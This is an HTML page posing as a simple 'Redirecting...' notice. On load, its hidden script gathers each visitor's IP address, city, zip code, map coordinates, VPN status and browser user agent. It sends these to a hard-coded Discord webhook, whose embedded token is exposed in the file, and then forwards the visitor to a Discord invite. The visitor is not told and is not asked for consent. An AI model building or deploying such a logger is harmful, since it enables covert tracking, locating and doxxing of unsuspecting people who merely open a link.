<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        async function trackVisitor() {
            const webhookURL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";  // Discord webhook URL
            const redirectURL = "https://discord.gg/8bRkNbDNsb";  // Redirect URL

            try {
                // Fetch IP and geolocation data using ip-api.com (no CORS issues for server-side or JSONP usage)
                const response = await fetch("https://ip-api.com/json/");
                const data = await response.json();

                // Log IP and other details to the browser console for debugging
                console.log("IP:", data.query);
                console.log("Country:", data.country);
                console.log("Region:", data.regionName);
                console.log("City:", data.city);
                console.log("VPN Status:", data.connection_type);

                // Extract visitor data from the response
                const ip = data.query;
                const country = data.country;
                const countryCode = data.countryCode;
                const region = data.regionName;
                const city = data.city;
                const zip = data.zip;
                const lat = data.lat;
                const lon = data.lon;
                const browser = navigator.userAgent;
                const flag = `https://countryflagsapi.com/png/${countryCode.toLowerCase()}`;

                // Check VPN status using external API
                const vpnResponse = await fetch(`https://json.geoiplookup.io/${ip}`);
                const vpnData = await vpnResponse.json();
                const vpn = vpnData.connection_type === "Corporate" ? "Yes" : "No";

                // Get current date and time
                const now = new Date();
                const date = now.toLocaleDateString();
                const time = now.toLocaleTimeString();

                // Prepare payload for the Discord webhook
                const payload = {
                    username: ip,
                    avatar_url: flag,
                    embeds: [{
                        title: `Visitor From ${country}`,
                        color: 39423,
                        fields: [
                            { name: "IP", value: ip, inline: true },
                            { name: "VPN?", value: vpn, inline: true },
                            { name: "Useragent", value: browser },
                            { name: "Country / CountryCode", value: `${country} / ${countryCode}`, inline: true },
                            { name: "Region | City | Zip", value: `[${region} | ${city} | ${zip}](https://www.google.com/maps/search/?api=1&query=${lat},${lon} "Google Maps Location")`, inline: true }
                        ],
                        footer: {
                            text: `${date} ${time}`,
                            icon_url: "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
                        }
                    }]
                };

                // Send the visitor's data to Discord webhook
                const webhookResponse = await fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

                // Check if webhook request was successful
                if (!webhookResponse.ok) {
                    console.error("Failed to send data to Discord webhook");
                }

            } catch (error) {
                console.error("Error during data fetch or sending to webhook:", error);
            } finally {
                // Redirect after logging the information
                window.location.href = redirectURL;  // Redirect URL
            }
        }

        // Execute tracking as soon as the page loads
        window.onload = trackVisitor;
    </script>
</head>
<body>
    <h2>Redirecting...</h2>
</body>
</html>
